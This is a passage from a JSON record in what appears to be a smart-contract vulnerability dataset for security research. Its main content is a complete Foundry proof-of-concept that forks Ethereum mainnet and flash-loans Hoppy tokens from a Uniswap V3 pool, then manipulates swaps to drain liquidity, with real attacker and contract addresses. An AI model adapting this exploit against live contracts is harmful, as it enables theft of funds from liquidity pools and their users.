erc/contracts/01_vulnerable_aa6f337f_uniswapv3pool/sources/contracts/libraries/UnsafeMath.sol", "data/contracts/2024_04_hoppyfrogerc/contracts/01_vulnerable_aa6f337f_uniswapv3pool/sources/contracts/libraries/FixedPoint96.sol"], "source_hint": "AI extracted: The `Uni_Pair_V3` contract is vulnerable to a flash loan attack. The `flash` function allows an attacker to borrow funds and then execute arbitrary logic within the `uniswapV3FlashCallback` function. In this POC, the attacker exploits this by performing a series of token swaps that manipulate the price of the `Hoppy` token, ultimately draining its liquidity and profiting from the price difference.", "verification_status": "verified"}], "contracts_dir": "data/contracts/2024_04_hoppyfrogerc", "id": "2024_04_hoppyfrogerc", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:35:59.833Z"}, "num_bytecode_contracts": 1, "num_contracts": 1, "num_source_contracts": 1, "num_verified_contracts": 1, "poc_code": "pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~0.3 ETH
// TX : https://app.blocksec.com/explorer/tx/eth/0x6fb7f8e9eb09d6ae17dbe82b2b42f46f64fb9c3197438b68ecf03e832d5fc791
// Attacker : https://etherscan.io/address/0x676c3262e8f0fba0031a93ea74ff801b99ac177b
// Attack Contract : https://etherscan.io/address/0xc976ed4b25e1e7019ff34fb54f4e63b1550b70c3
// GUY : https://x.com/ChainAegis/status/1775351437410918420

contract Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 Pair = Uni_Pair_V3(0xaA6f337f16E6658d9c9599c967D3126051b6c726);
    IERC20 Hoppy = IERC20(0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function setUp() external {
        cheats.createSelectFork("mainnet", 19_570_744);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WETH before exploit", WETH.balanceOf(address(this)), 18);
        uint256 amount = Hoppy.balanceOf(address(Pair));
        Pair.flash(address(this), 0, amount, "123");
        emit log_named_decimal_uint("[End] Attacker WETH after exploit", WETH.balanceOf(address(this)), 18);
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        Hoppy.approve(address(Router), type(uint256).max);
        swap_token_to_token(address(Hoppy), address(WETH), 3_071_435_167_652_113_869_853);
        Hoppy.transfer(address(Hoppy), 206_900_000_001_000_000_000);
        swap_token_to_token(address(Hoppy), address(WETH), 4_206_900_000_000_000_000_000);
        swap_token_to_ExactToken(
            7_560_087_519_329_645_008_552, address(WETH), address(Hoppy), 3_907_363_705_363_283_233
        );
        Hoppy.transfer(address(msg.sender), 7_560_087_519_329_645_008_552);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    function swap_token_to_ExactToken(uint256 amountout, address a, address b, uint256 amountInMax) public payable {
        IERC20(a).approve(address(Router), amountInMax);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapTokensForExactTokens(amountout, amountInMax, path, address(this), block.timestamp + 120);
    }
}
